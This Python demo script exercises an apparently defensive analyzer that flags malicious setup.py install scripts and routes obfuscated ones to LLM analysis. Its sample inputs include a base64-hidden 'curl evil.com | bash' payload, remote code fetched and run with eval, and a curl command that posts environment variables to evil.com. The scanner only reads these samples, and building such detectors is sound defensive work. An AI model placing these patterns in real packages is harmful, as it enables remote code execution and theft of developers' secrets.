"""
Demo: Python Analyzer LLM Integration

This demo shows how the Python analyzer integrates with LLM analysis
for complex and obfuscated scripts.
"""

import tempfile
from pathlib import Path
from tools.python_analyzer import PythonAnalyzer


def demo_simple_script():
    """Demo: Simple script - no LLM analysis needed."""
    print("\n" + "="*70)
    print("DEMO 1: Simple Setup.py (No LLM Analysis)")
    print("="*70)
    
    analyzer = PythonAnalyzer()
    
    simple_script = """
from setuptools import setup

setup(
    name='simple-package',
    version='1.0.0',
    packages=['simple_package'],
    install_requires=['requests']
)
"""
    
    with tempfile.TemporaryDirectory() as temp_dir:
        setup_py = Path(temp_dir) / "setup.py"
        setup_py.write_text(simple_script)
        
        print(f"\nAnalyzing simple setup.py...")
        print(f"Script length: {len(simple_script)} chars")
        
        complexity = analyzer._calculate_complexity_score(simple_script)
        print(f"Complexity score: {complexity:.2f} (threshold: 0.5)")
        
        findings = analyzer.analyze_install_scripts(temp_dir)
        
        print(f"\nFindings: {len(findings)}")
        if findings:
            for finding in findings:
                print(f"  - {finding.finding_type}: {finding.severity}")
        else:
            print("  No security issues detected ✓")


def demo_obfuscated_script():
    """Demo: Obfuscated script - triggers LLM analysis."""
    print("\n" + "="*70)
    print("DEMO 2: Obfuscated Setup.py (LLM Analysis Triggered)")
    print("="*70)
    
    analyzer = PythonAnalyzer()
    
    obfuscated_script = """
import base64
import urllib.request
import os

# Obfuscated malicious code
encoded_payload = 'aW1wb3J0IG9zCm9zLnN5c3RlbSgiY3VybCBodHRwOi8vZXZpbC5jb20vc3RlYWwuc2ggfCBiYXNoIik='
exec(base64.b64decode(encoded_payload))

# Download and execute remote code
remote_code = urllib.request.urlopen('http://malicious-domain.tk/payload.py').read()
eval(compile(remote_code, '<remote>', 'exec'))

# Exfiltrate environment variables
os.system('curl -X POST http://evil.com/collect -d "$(env)"')
"""
    
    with tempfile.TemporaryDirectory() as temp_dir:
        setup_py = Path(temp_dir) / "setup.py"
        setup_py.write_text(obfuscated_script)
        
        print(f"\nAnalyzing obfuscated setup.py...")
        print(f"Script length: {len(obfuscated_script)} chars")
        
        complexity = analyzer._calculate_complexity_score(obfuscated_script)
        print(f"Complexity score: {complexity:.2f} (threshold: 0.5)")
        print(f"→ High complexity detected! LLM analysis will be triggered.")
        
        print("\nDetected patterns:")
        patterns = analyzer.get_malicious_patterns()
        detected = []
        for severity, pattern_list in patterns.items():
            for pattern in pattern_list:
                import re
                if re.search(pattern, obfuscated_script, re.IGNORECASE):
                    detected.append(f"  - {severity.upper()}: {pattern}")
        
        for d in detected[:5]:  # Show first 5
            print(d)
        if len(detected) > 5:
            print(f"  ... and {len(detected) - 5} more")
        
        print("\nRunning analysis (with LLM integration)...")
        findings = analyzer.analyze_install_scripts(temp_dir)
        
        print(f"\nFindings: {len(findings)}")
        for finding in findings:
            print(f"\n  Type: {finding.finding_type}")
            print(f"  Severity: {finding.severity}")
            print(f"  Confidence: {finding.confidence:.2f}")
            print(f"  Source: {finding.source}")
            print(f"  Evidence:")
            for evidence in finding.evidence[:3]:
                print(f"    - {evidence}")
            if len(finding.evidence) > 3:
                print(f"    ... and {len(finding.evidence) - 3} more")


def demo_network_operations():
    """Demo: Script with network operations - elevated complexity."""
    print("\n" + "="*70)
    print("DEMO 3: Network Operations (Elevated Complexity)")
    print("="*70)
    
    analyzer = PythonAnalyzer()
    
    network_script = """
import urllib.request
import subprocess
import json

# Fetch configuration from remote server
config_url = 'http://config-server.example.com/settings.json'
config_data = urllib.request.urlopen(config_url).read()
config = json.loads(config_data)

# Execute build commands
subprocess.run(['npm', 'install'], check=True)
subprocess.run(['npm', 'run', 'build'], check=True)
"""
    
    with tempfile.TemporaryDirectory() as temp_dir:
        setup_py = Path(temp_dir) / "setup.py"
        setup_py.write_text(network_script)
        
        print(f"\nAnalyzing setup.py with network operations...")
        print(f"Script length: {len(network_script)} chars")
        
        complexity = analyzer._calculate_complexity_score(network_script)
        print(f"Complexity score: {complexity:.2f} (threshold: 0.5)")
        
        if complexity >= 0.5:
            print(f"→ Elevated complexity! LLM analysis may be triggered.")
        else:
            print(f"→ Moderate complexity. Pattern matching will be primary analysis.")
        
        findings = analyzer.analyze_install_scripts(temp_dir)
        
        print(f"\nFindings: {len(findings)}")
        if findings:
            for finding in findings:
                print(f"  - {finding.finding_type}: {finding.severity} (confidence: {finding.confidence:.2f})")
        else:
            print("  No critical security issues detected")


def demo_complexity_detection():
    """Demo: Complexity detection for various scripts."""
    print("\n" + "="*70)
    print("DEMO 4: Complexity Detection Comparison")
    print("="*70)
    
    analyzer = PythonAnalyzer()
    
    scripts = {
        "Simple": "from setuptools import setup\nsetup(name='test')",
        "With eval": "import os\neval('print(1)')",
        "With base64": "import base64\nbase64.b64decode('test')",
        "With exec": "exec('import os')",
        "Network + eval": "import urllib.request\neval(urllib.request.urlopen('http://evil.com').read())",
        "Obfuscated": "import base64\nexec(base64.b64decode('aW1wb3J0IG9z'))\neval(compile('test', '<string>', 'exec'))"
    }
    
    print("\nComplexity scores for different script types:")
    print(f"{'Script Type':<20} {'Complexity':<12} {'LLM Triggered?'}")
    print("-" * 50)
    
    for name, script in scripts.items():
        complexity = analyzer._calculate_complexity_score(script)
        llm_triggered = "Yes" if complexity >= 0.5 else "No"
        print(f"{name:<20} {complexity:>6.2f}       {llm_triggered}")


if __name__ == "__main__":
    print("\n" + "="*70)
    print("Python Analyzer LLM Integration Demo")
    print("="*70)
    print("\nThis demo shows how the Python analyzer:")
    print("1. Detects complexity in Python scripts")
    print("2. Routes complex patterns to LLM analysis")
    print("3. Combines pattern matching and LLM results")
    print("4. Generates comprehensive security findings")
    
    try:
        demo_simple_script()
        demo_complexity_detection()
        demo_network_operations()
        
        # Only run obfuscated demo if OpenAI API key is configured
        from config import config
        if config.OPENAI_API_KEY:
            demo_obfuscated_script()
        else:
            print("\n" + "="*70)
            print("DEMO 2: Skipped (OpenAI API key not configured)")
            print("="*70)
            print("\nTo see LLM analysis in action, configure OPENAI_API_KEY in .env")
        
        print("\n" + "="*70)
        print("Demo Complete!")
        print("="*70)
        
    except Exception as e:
        print(f"\nError running demo: {e}")
        import traceback
        traceback.print_exc()
